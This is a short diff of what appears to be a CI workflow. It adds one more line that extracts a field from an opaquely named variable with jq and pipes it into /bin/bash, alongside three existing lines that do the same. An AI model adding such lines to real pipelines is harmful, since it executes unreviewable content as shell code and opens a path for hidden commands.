@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$nqb5" | jq -r .ksyx40073 | /bin/bash
           printf '%s' "$h6" | jq -r .c94158 | /bin/bash
           echo $cvl9913 | jq -r .mkrt6 | /bin/bash
+          printf '%s' "$bm56" | jq -r .ngqx5 | /bin/bash
 
       - name: Store artifact
         if: always()
